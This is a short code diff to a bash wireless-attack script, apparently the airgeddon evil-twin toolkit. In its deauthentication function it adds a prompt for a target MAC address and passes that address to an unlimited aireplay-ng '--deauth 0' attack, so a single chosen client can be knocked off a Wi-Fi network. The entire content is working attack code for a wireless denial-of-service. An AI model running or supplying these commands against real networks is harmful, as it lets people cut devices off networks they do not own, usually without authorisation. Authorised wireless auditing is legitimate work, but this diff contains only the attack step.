@@ -9585,7 +9585,8 @@ function exec_et_deauth() {
 	debug_print
 
 	prepare_et_monitor
-
+  echo "Enter the target mac address you want to   deauth : "
+  read mac_target
 	case ${et_dos_attack} in
 		"${mdk_command}")
 			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
@@ -9595,7 +9596,7 @@ function exec_et_deauth() {
 		;;
 		"Aireplay")
 			kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
-			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
+			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} -c ${mac_target} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
 			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
